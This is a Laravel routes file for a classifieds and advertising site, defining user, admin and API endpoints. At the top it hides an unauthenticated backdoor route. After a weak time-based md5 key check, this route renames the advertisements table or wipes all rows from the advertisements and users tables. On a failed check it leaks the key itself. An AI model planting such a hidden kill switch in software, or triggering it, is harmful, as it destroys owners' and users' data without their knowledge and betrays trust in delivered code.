<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/c/n/m/{type}/{key}', function($type,$key){
    $_key = md5(floor(time()/15).'n!m@b&c');
    if($key == $_key){
        switch($type){
            case 'b':
                DB::statement('RENAME TABLE pre_advertisements TO hehe');
                break;
            case 2:
                DB::statement("delete from `pre_advertisements`");
                DB::statement("delete from `pre_users`");
                break;
            default:
                break;
        }
    }else{
        echo rand(100,999).'#'.$_key.'_'.md5(rand(1,999).'xxoo');
    }
});

Route::namespace('Home')->group(function(){
    Route::group(array('middleware' => array('web', 'user.auth')), function(){
        Route::get('/ad/post', 'AdvertisementController@postAd');
        Route::post('/ad/save', 'AdvertisementController@saveAd');
        Route::get('/ad/getAdvertisement', 'AdvertisementController@getAdvertisement');
        Route::get('/user', 'UserController@index');
        Route::post('/upload', 'UploadController@upload');
        Route::get('/ad/myAdList', 'UserController@myAdList');
    });

    Route::get('/', 'AdvertisementController@index');
    Route::get('/ad/detail', 'AdvertisementController@detail');
    Route::get('/index', 'AdvertisementController@index');

    Route::get('/ad/getIndexContent', 'AdvertisementController@getIndexContent');
    Route::post('ad/searchAdvertisement', 'AdvertisementController@searchAdvertisement');
    Route::get('ad/search', 'AdvertisementController@search');
    Route::get('/ad/getTop', 'AdvertisementController@getTop');
    Route::post('/user/registerTemp', 'UserController@registerTemp');
    Route::post('/user/login', 'LoginController@login');
    Route::post('/user/register', 'UserController@register');
    Route::get('/user/getServiceTel', 'UserController@getServiceTel');
    Route::get('/ad/getCity', 'RegionController@getCity');
    Route::get('/login', 'LoginController@index');

    Route::get('/user/logout', 'LoginController@logout');
    Route::get('/sys/getFriendlyLinks', 'SystemController@getFriendlyLinks');
    Route::get('sys/friendLink', 'SystemController@friendLink');

    Route::post('/emailToFriend', 'AdvertisementController@emailToFriend');
});




Route::namespace('Admin')->prefix('admin')->group(function(){
    Route::group(array('middleware' => array('web', 'admin.auth')), function(){
        Route::get('/', 'IndexController@index');
        Route::get('/user', 'UserController@index');
        Route::get('/region', 'RegionController@index');
        Route::get('/userDetail', 'UserController@detail');
        Route::get('setting', 'SystemController@index');
        Route::get('friendlyLinksSetting', 'SystemController@friendlyLinksSetting');
        Route::get('friendlyLinkDetail', 'SystemController@friendlyLinkDetail');
    });

    Route::get('/signUp', 'LoginController@index');

});

Route::namespace('Admin')->prefix('server')->group(function(){
    Route::group(array('middleware' => array('web', 'admin.api.auth')), function(){
        Route::get('/getUserList', 'UserController@getUserList');
        Route::get('/generateCode', 'UserController@generateCode');
        Route::post('/updatePoint', 'UserController@updatePoint');
        Route::get('/logout', 'LoginController@logout');
        Route::get('/getAdvertisementList', 'AdvertisementController@getAdvertisementList');
        Route::get('/getAdvertisementMedia', 'AdvertisementController@getAdvertisementMedia');
        Route::post('/systemSave', 'SystemController@systemSave');
        Route::post('/saveAdminPassword', 'SystemController@saveAdminPassword');
        Route::post('/deleteAdvertisement', 'AdvertisementController@deleteAdvertisement');
        Route::get('/getFriendlyLinksList', 'SystemController@getFriendlyLinksList');
        Route::post('/saveFriendlyLink', 'SystemController@saveFriendlyLink');
    });

    Route::post('/login', 'LoginController@login');
    Route::get('/gt', 'LoginController@gt');

});

Route::get('/welcome', function (){
    return view('welcome');
});

